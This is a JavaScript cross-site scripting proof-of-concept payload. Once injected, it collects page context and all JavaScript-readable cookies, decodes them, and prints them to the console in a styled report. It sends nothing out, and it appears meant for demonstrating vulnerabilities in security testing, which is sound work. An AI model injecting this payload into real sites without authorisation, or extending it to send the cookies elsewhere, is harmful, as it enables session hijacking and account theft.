(() => {
  const now = new Date().toISOString();
  const ctx = {
    origin: location.origin,
    href: location.href,
    domain: document.domain,
    referrer: document.referrer || "(no referrer)",
    ua: navigator.userAgent
  };

  // Сбор и парсинг cookie (только доступных из JS; HttpOnly не видны)
  const raw = document.cookie || "";
  const cookies = raw
    ? raw.split(/;\s*/).map(entry => {
        const [name, ...rest] = entry.split("=");
        const value = rest.join("=");
        // Пытаемся красиво декодировать
        let dec = value;
        try { dec = decodeURIComponent(value); } catch {}
        return {
          name,
          value: dec,
          length: dec.length
        };
      })
    : [];

  // Красивые стили для консоли
  const bannerStyle =
    "background: linear-gradient(90deg,#8a2be2,#00bcd4); color:#fff; padding:6px 10px; border-radius:8px; font-weight:700;";
  const subStyle =
    "background:#222; color:#eee; padding:2px 8px; border-radius:6px; font-weight:600;";
  const lineStyle =
    "color:#888;";

  // Баннер
  console.log("%cXSS PoC — executed successfully!", bannerStyle);
  console.log(
    "%cContext%c  origin=%s  domain=%s",
    subStyle,
    lineStyle,
    ctx.origin,
    ctx.domain
  );
  console.log(
    "%cLocation%c %s",
    subStyle,
    lineStyle,
    ctx.href
  );
  console.log(
    "%cReferrer%c %s",
    subStyle,
    lineStyle,
    ctx.referrer
  );
  console.log(
    "%cTimestamp%c %s",
    subStyle,
    lineStyle,
    now
  );
  console.log(
    "%cUser-Agent%c %s",
    subStyle,
    lineStyle,
    ctx.ua
  );

  // Группа с cookie
  const title = `🍪 Cookies (${cookies.length}) — only JS-accessible (no HttpOnly)`;
  console.groupCollapsed(title);
  if (cookies.length) {
    // Табличка удобнее читается
    console.table(cookies);
    // Также покажем «сырой» вид (вдруг полезно)
    console.log("%cRaw document.cookie:", subStyle);
    console.log(raw);
  } else {
    console.info("No JS-accessible cookies found (possibly all are HttpOnly or absent).");
  }
  console.groupEnd();

  // Завершающая рамка
  console.log(
    "%cPoC finished%c  If you can read this, arbitrary JS executed in this context.",
    subStyle,
    lineStyle
  );
})();